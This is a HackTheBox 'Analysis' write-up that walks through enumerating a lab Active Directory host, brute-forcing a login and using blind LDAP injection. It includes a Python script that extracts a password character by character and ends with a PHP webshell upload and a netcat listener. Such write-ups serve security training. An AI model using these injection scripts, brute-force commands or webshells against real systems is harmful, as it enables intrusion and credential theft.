---
title: HTB - Analysis
date: 2024-01-24
categories: [CTF, Fullpwn]
tags: [htb, hackthebox, analysis, ldap, ffuf, dir-busting, subdomain, virtual-host]
img_path: /assets/htb/fullpwn/analysis/
published: true
hidden: false
image:
    path: machine_info.png
---

> CONTENT HIDDEN - ACTIVE MACHINE!
{: .prompt-warning}

<!-- ## Information gathering

Nmap port-scan:

```bash
# port-scanning
$ sudo nmap -sS -A -Pn --min-rate 10000 -p- 10.10.11.250

PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Simple DNS Plus
80/tcp    open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
88/tcp    open  kerberos-sec  Microsoft Windows Kerberos (server time: 2024-01-20 21:05:06Z)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn?
389/tcp   open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds?
464/tcp   open  kpasswd5?
593/tcp   open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped
3268/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: analysis.htb0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped
3306/tcp  open  mysql         MySQL (unauthorized)
5985/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
9389/tcp  open  adws?
33060/tcp open  mysqlx?
47001/tcp open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
49670/tcp open  ncacn_http    Microsoft Windows RPC over HTTP 1.0

<SNIP>
```

Add domain to local DNS file:

```bash
$ cat /etc/hosts | grep ana
10.10.11.250  analysis.htb
```

## Kerberos enumeration

Enumerating **domain users** via Kerberos:

```bash
$ kerbrute_linux_amd64 userenum --dc 10.10.11.250 -d analysis.htb /usr/share/wordlists/seclists/Usernames/xato-net-10-million-usernames.txt

2024/01/21 09:23:03 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/21 09:24:53 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/21 09:28:54 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/21 09:29:11 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/21 09:30:08 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/21 09:34:08 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/21 09:38:01 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/21 09:38:16 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/21 09:54:43 >  [+] VALID USERNAME:       badam@analysis.htb
```

Create a `mailList` and a `userList` for future use:

```bash
$ cat kerbList
2024/01/21 09:23:03 >  [+] VALID USERNAME:       jdoe@analysis.htb
2024/01/21 09:24:53 >  [+] VALID USERNAME:       ajohnson@analysis.htb
2024/01/21 09:28:54 >  [+] VALID USERNAME:       cwilliams@analysis.htb
2024/01/21 09:29:11 >  [+] VALID USERNAME:       wsmith@analysis.htb
2024/01/21 09:30:08 >  [+] VALID USERNAME:       jangel@analysis.htb
2024/01/21 09:34:08 >  [+] VALID USERNAME:       technician@analysis.htb
2024/01/21 09:38:01 >  [+] VALID USERNAME:       JDoe@analysis.htb
2024/01/21 09:38:16 >  [+] VALID USERNAME:       AJohnson@analysis.htb
2024/01/21 09:54:43 >  [+] VALID USERNAME:       badam@analysis.htb

# create a mailList
$ cat userList | awk '{print $(NF)}' > mailList
$ cat mailList
jdoe@analysis.htb
ajohnson@analysis.htb
cwilliams@analysis.htb
wsmith@analysis.htb
jangel@analysis.htb
technician@analysis.htb
JDoe@analysis.htb
AJohnson@analysis.htb
badam@analysis.htb

# create a userList
$ cat kerbList | awk '{print $(NF)}' | cut -d "@" -f 1 > userList
$ cat userList
jdoe
ajohnson
cwilliams
wsmith
jangel
technician
JDoe
AJohnson
badam
```

## Web server enumeration

### Domain enumeration: `analysis.htb`

**Technologies used**: 

```bash
$ whatweb analysis.htb
http://analysis.htb [200 OK] Country[RESERVED][ZZ], Email[mail@demolink.org,privacy@demolink.org], HTTPServer[Microsoft-IIS/10.0], IP[10.129.198.245], JQuery, Microsoft-IIS[10.0], Script[text/javascript]
```

- `demolink.org` domain?

**Dir-busting**:

```bash
$ ffuf -u http://analysis.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -ac -e .aspx,.html,.php,.txt,.jsp

________________________________________________

 :: Method           : GET
 :: URL              : http://analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

images                  [Status: 301, Size: 162, Words: 9, Lines: 2, Duration: 32ms]
index.html              [Status: 200, Size: 17830, Words: 1418, Lines: 287, Duration: 36ms]
css                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 30ms]
js                      [Status: 301, Size: 158, Words: 9, Lines: 2, Duration: 28ms]
bat                     [Status: 301, Size: 159, Words: 9, Lines: 2, Duration: 28ms]
```

**Vhost** and **Subdomain enumeration**:

```bash
$ ffuf -w /usr/share/wordlists/seclists/Discovery/DNS/namelist.txt -u http://10.10.11.250 -H "HOST: FUZZ.analysis.htb"

<SNIP>

internal                [Status: 403, Size: 1268, Words: 74, Lines: 30, Duration: 32ms]
```

We know that our target has a DNS server, so we could also use it as our resolver for subdomain enumeration:

```bash
$ gobuster dns -d analysis.htb -w /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt -r 10.10.11.250:53
===============================================================
Gobuster v3.6
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Domain:     analysis.htb
[+] Threads:    10
[+] Resolver:   10.10.11.250:53
[+] Timeout:    1s
[+] Wordlist:   /usr/share/wordlists/seclists/Discovery/DNS/subdomains-top1million-20000.txt
===============================================================
Starting gobuster in DNS enumeration mode
===============================================================
Found: www.analysis.htb
Found: internal.analysis.htb
Found: gc._msdcs.analysis.htb
Found: domaindnszones.analysis.htb
Found: forestdnszones.analysis.htb
```

#### Results

| Domain  | analysis.htb                                                    |
|----------------------|-----------------------------------------------------|
|          Directories | images, index.html, css, js, bat                    |
|           Subdomains | internal, gc._msdcs, domaindnszones, forestdnszones |

Add `internal` subdomain to local DNS file:

```bash
$ cat /etc/hosts | grep ana
10.10.11.250  analysis.htb internal.analysis.htb
```

### Subdomain enumeration: `internal.analysis.htb`

#### Dir-busting subdomain

```bash
# enumerating directories on the internal subdomain
$ ffuf -u http://internal.analysis.htb/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-medium.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

<SNIP>

users                   [Status: 301, Size: 170, Words: 9, Lines: 2, Duration: 33ms]
dashboard               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 33ms]
employees               [Status: 301, Size: 174, Words: 9, Lines: 2, Duration: 33ms]
```

#### Dir-busting subdirectories

**Dashboard** directory:

```bash
# enumerating directories for /dashboard
$ ffuf -u http://internal.analysis.htb/dashboard/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/dashboard/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

index.php               [Status: 200, Size: 38, Words: 3, Lines: 5, Duration: 79ms]
img                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 33ms]
uploads                 [Status: 301, Size: 182, Words: 9, Lines: 2, Duration: 38ms]
upload.php              [Status: 200, Size: 0, Words: 1, Lines: 1, Duration: 306ms]
details.php             [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 81ms]
css                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 38ms]
license.txt             [Status: 200, Size: 1422, Words: 253, Lines: 35, Duration: 39ms]
lib                     [Status: 301, Size: 178, Words: 9, Lines: 2, Duration: 30ms]
form.php                [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 33ms]
js                      [Status: 301, Size: 177, Words: 9, Lines: 2, Duration: 33ms]
logout.php              [Status: 302, Size: 3, Words: 1, Lines: 1, Duration: 38ms]
404.html                [Status: 200, Size: 13143, Words: 4690, Lines: 237, Duration: 37ms]
tickets.php             [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 47ms]
emergency.php           [Status: 200, Size: 35, Words: 3, Lines: 5, Duration: 34ms]
```

**Employees** directory:

```bash
# enumerating directories for /employees
$ ffuf -u http://internal.analysis.htb/employees/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/employees/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

login.php               [Status: 200, Size: 1085, Words: 413, Lines: 30, Duration: 45ms]
```

**Users** directory:

```bash
# enumerating directories for /users
$ ffuf -u http://internal.analysis.htb/users/FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt -e .aspx,.html,.php,.txt,.jsp -c -ac

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/directory-list-2.3-small.txt
 :: Extensions       : .aspx .html .php .txt .jsp
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

list.php                [Status: 200, Size: 17, Words: 2, Lines: 1, Duration: 80ms]
```

#### Results

| Subdomain   | internal.analysis.htb       |
|-------------|-----------------------------|
| Directories | users, dashboard, employees |

| Subdomain directory | Subdirectories                                                                                                                          |
|:-------------------:|-----------------------------------------------------------------------------------------------------------------------------------------|
|           dashboard | index.php, img, uploads, upload.php, details.php, css, license.txt, lib, form.php, js, logout.php, 404.html, tickets.php, emergency.php |
|           employees | login.php                                                                                                                               |
|               users | list.php                                                                                                                                |

### Findings recap and next steps

1. `internal.analysis.htb` seems the most crucial subdomain to explore.
2. `users/list.php`
    - Do a parameter-scan.
3. `employees` has the login portal and we already have a user list
    - brute-force portal?

### Parameter enumeration: `internal.analysis.htb/users/list.php`

```bash
# enumerating users/list.php parameters
$ ffuf -u http://internal.analysis.htb/users/list.php?FUZZ -w /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt -ac -c

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/burp-parameter-names.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

name                    [Status: 200, Size: 406, Words: 11, Lines: 1, Duration: 37ms]
```

We could try going through a standard username list as well as our `userList` to see if anything interesting comes back for the `name` parameter, i.e., potential valid usernames:

```bash
# enumerating name parameter with standard wordlist
$ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ -w /usr/share/wordlists/seclists/Usernames/Names/names.txt -ac -c
# nothing back

# enumerating name parameter with custom wordlist
$ ffuf -u http://internal.analysis.htb/users/list.php?name=FUZZ -w userList -ac -c

________________________________________________
 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=FUZZ
 :: Wordlist         : FUZZ: /home/kali/htb/fullpwn/analysis/userList
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

jangel                  [Status: 200, Size: 416, Words: 11, Lines: 1, Duration: 38ms]
technician              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 38ms]
badam                   [Status: 200, Size: 412, Words: 11, Lines: 1, Duration: 43ms]
```

It seems that we have 3 users that we could maybe use to login to the portal. We can put those usernames in a new list and try brute-forcing their passwords. The login portal looks let us know that employees use their email to login and not their username:

![](employees_loginPHP.png){: .normal width="85%"}


```bash
# creating a new email list
$ cat mailList | grep "tech\|badam\|jangel" > mailList_reduced
$ cat mailList_reduced
jangel@analysis.htb
technician@analysis.htb
badam@analysis.htb
```

We can now trying brute-forcing `/login.php`. We can find what is the appropriate string to put on the `hydra`'s `F` parameter by using some random credentials, e.g. `test:test`, to login:

![](test_login_error.png){: .normal width="85%"}

The text we should put there is not the "*Wrong Data*" string, but what is hidden in the source code as the **class label**, i.e., "*text-danger*":

![](text-danger.png){: .normal width="65%"}

```bash
# brute-forcing the login portal
$ hydra -L mailList_reduced -P /usr/share/wordlists/rockyou.txt internal.analysis.htb http-post-form "/employees/login.php:log=^USER^&pwd=^PASS^:F=text-danger" -t 30
# nothing back
```

## Initial foothold

### What is LDAP

According to [Varonis](https://www.varonis.com/blog/the-difference-between-active-directory-and-ldap#:~:text=An%20LDAP%20query%20is%20a,%3DYourDomain%2CDC%3Dcom): 

_**LDAP (Lightweight Directory Access Protocol)** is an open and cross platform protocol used for directory services authentication and provides the communication language that applications use to communicate with other directory services servers._ 

> **Directory services** store the users, passwords, and computer accounts, and share that information with other entities on the network.

In layman's terms: **LDAP is a way of speaking to Active Directory (AD)** and it is used to store information about users, hosts, and many other objects.

The relationship between AD and LDAP is much like the relationship between Apache and HTTP:

- HTTP is a web protocol.
- Apache is a web server that uses the HTTP protocol.
- LDAP is a directory services protocol.
- AD is a directory server that uses the LDAP protocol.

### What is an LDAP query

An **LDAP query is a command that asks a directory service for some information**. For instance, if you’d like to see which groups a particular user is a part of, you’d submit a query that looks like this:

`(&(objectClass=user)(sAMAccountName=yourUserName)   (memberof=CN=YourGroup,OU=Users,DC=YourDomain,DC=com))`

> IppSec's video: [LDAP query structure](https://youtu.be/51JQg202csw?t=1007).

### What is an LDAP Injection

According to the [OWASP Web Security Testing Guide](https://github.com/OWASP/wstg/blob/master/document/4-Web_Application_Security_Testing/07-Input_Validation_Testing/06-Testing_for_LDAP_Injection.md):

_[**LDAP injection**](https://wiki.owasp.org/index.php/LDAP_injection) is a server-side attack, which could allow sensitive information about users and hosts represented in an LDAP structure to be disclosed, modified, or inserted. This is done by **manipulating input parameters afterwards passed to internal search**, add, and modify functions. A web application could use LDAP in order to let users authenticate or search other users' information inside a corporate structure. **The goal of LDAP injection attacks is to inject LDAP search filters metacharacters in a query which will be executed by the application**._

In layman's term: **LDAP Injection is a [syntax-weird](https://en.wikipedia.org/wiki/Polish_notation) SQLi**. 

> Useful resources: [PayloadsAllTheThings: LDAP Injection](https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/LDAP%20Injection), [Common LDAP Attribute Names](https://ftpdocs.broadcom.com/cadocs/0/CA%20Process%20Automation%2004%202%2002-ENU/Bookshelf_Files/HTML/Content%20Designer%20Reference/1187917.html).


Since we already know that there is a `name` parameter, we could start fuzzing for the next one:

```bash
$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=t*)(FUZZ=*' -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -ac -c

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=t*)(FUZZ=*
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 507ms]
badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
createTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 55ms]
distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 48ms]
givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 50ms]
instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 53ms]
lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 55ms]
lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
modifyTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 40ms]
nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 54ms]
objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 51ms]
objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 50ms]
pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 57ms]
replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 120ms]
userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 129ms]
```

We know the the value of the `objectClass` attribute should be `user` since `technician` is a user. So we can try set this attribute, and continue our fuzzing journey:

> [Active Directory User Object: An Introduction](https://www.windows-active-directory.com/active-directory-user-objects-management.html).

```bash
$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(FUZZ=*)' -w /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt -ac -c

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(FUZZ=*)
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/LDAP-active-directory-attributes.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

accountExpires          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 115ms]
badPwdCount             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 78ms]
badPasswordTime         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 90ms]
countryCode             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 33ms]
cn                      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 95ms]
codePage                [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 104ms]
createTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 107ms]
description             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 59ms]
distinguishedName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 67ms]
givenName               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 130ms]
instanceType            [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 108ms]
lastLogoff              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 85ms]
lastLogon               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 82ms]
logonCount              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
modifyTimeStamp         [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 80ms]
name                    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 102ms]
nTSecurityDescriptor    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 49ms]
objectGUID              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 41ms]
objectCategory          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 90ms]
objectSid               [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 78ms]
objectClass             [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 82ms]
pwdLastSet              [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 75ms]
replPropertyMetaData    [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 67ms]
sAMAccountType          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
sAMAccountName          [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 60ms]
userAccountControl      [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 44ms]
userPrincipalName       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 65ms]
```

There seem to be a lot of attributes to test. We can brute-forcing one-by-one and see what we get. Since it is common for the `description` field to hold interesting information we can start with that. 

We can perform the LDAP Injection manually by using a tool like `fuff` to fuzz it. As shown below, we get the first character (`9`) as a response, which we can then add to the same command and get the second character (`7`), and so on:

```bash
# performing LDAP injection manually
$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

________________________________________________

 :: Method           : GET
 :: URL              : http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=FUZZ*)
 :: Wordlist         : FUZZ: /usr/share/seclists/Fuzzing/alphanum-case-extra.txt
 :: Follow redirects : false
 :: Calibration      : true
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
 :: Filter           : Response size: 8
________________________________________________

9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 47ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=9FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

7                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

N                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 40ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

T                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

t                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

l                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtlFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
```

While fuzzing using the string `97NTtlFUZZ*` it outputs nothing. That means either that the password is what we already have, i.e, `97NTtl`, or there is a special character that cannot be interpreterted as a "simple" character.

For instance, [asterisk (`*`)](https://lgfang.github.io/computer/2021/12/15/ldap-search-wildcard) is used as a wildcard almost everywhere, such as regex, bash, and **LDAP search filters**, among others. Knowing that, we can try placing such characters manually, until we get something back. In this case, the `*` char seems to do the trick:

```bash
$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

4                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

Q                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

P                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QPFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

9                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP9FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

6                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96FUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

B                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96BFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

v                       [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]

$ ffuf -u 'http://internal.analysis.htb/users/list.php?name=technician)(%26(objectClass=user)(description=97NTtl*4QP96BvFUZZ*)' -w /usr/share/seclists/Fuzzing/alphanum-case-extra.txt -ac -c -fs 8

                        [Status: 200, Size: 418, Words: 11, Lines: 1, Duration: 70ms]
```

The following [Python script](https://github.com/CSpanias/cspanias.github.io/blob/main/assets/htb/fullpwn/analysis/brute-force.py) is a more efficient way to brute-force `technician`'s password:

```python
import argparse
import requests
import urllib.parse

def main():
    charset_path = "/usr/share/wordlists/seclists/Fuzzing/alphanum-case-extra.txt"
    base_url = "http://internal.analysis.htb/users/list.php?name=*)(%26(objectClass=user)(description={found_char}{FUZZ}*)"
    found_chars = ""
    skip_count = 6
    add_star = True
    with open(charset_path, 'r') as file:
        for char in file:
            char = char.strip()
            # URL encode the character
            char_encoded = urllib.parse.quote(char)
            # Check if '*' is found and skip the first 6 '*' characters
            if '*' in char and skip_count > 0:
                skip_count -= 1
                continue
            # Add '*' after encountering it for the first time
            if '*' in char and add_star:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                add_star = False
                continue
            modified_url = base_url.replace("{FUZZ}", char_encoded).replace("{found_char}", found_chars)
            response = requests.get(modified_url)
            if "technician" in response.text and response.status_code == 200:
                found_chars += char
                print(f"[+] Found Password: {found_chars}")
                file.seek(0, 0)
if __name__ == "__main__":
    main()
```

If we run the above script:

```bash
$ python3 brute_force.py
[+] Found Password: 9
[+] Found Password: 97
[+] Found Password: 97N
[+] Found Password: 97NT
[+] Found Password: 97NTt
[+] Found Password: 97NTtl
[+] Found Password: 97NTtl*
[+] Found Password: 97NTtl*4
[+] Found Password: 97NTtl*4Q
[+] Found Password: 97NTtl*4QP
[+] Found Password: 97NTtl*4QP9
[+] Found Password: 97NTtl*4QP96
[+] Found Password: 97NTtl*4QP96B
[+] Found Password: 97NTtl*4QP96Bv
[+] Found Password: 97NTtl*4QP96Bv
[+] Found Password: 97NTtl*4QP96Bv
```

We now have some credentials: `technician:97NTtl*4QP96Bv` which we can use to log into the portal. There is an upload functionality via the "*SOC Report*" tab:

![](revshell_upload.png)

We can try to upload a webshell and visit the appropriate directory (which should be the `dashboard/uploads/<revshell>` that we found earlier) to test its functionality. If it works, we can then open a listener and pass reveshell command through it:

```bash
# webshell's contents
$ cat revshell.php
<?php system($_GET['c']); ?>
```

![](svc_web_shell.png)

Now, we can open a listener and create a PowerShell-based reverse shell:

```bash
# opening a listener to catch the shell
$ nc -lnvp 1337
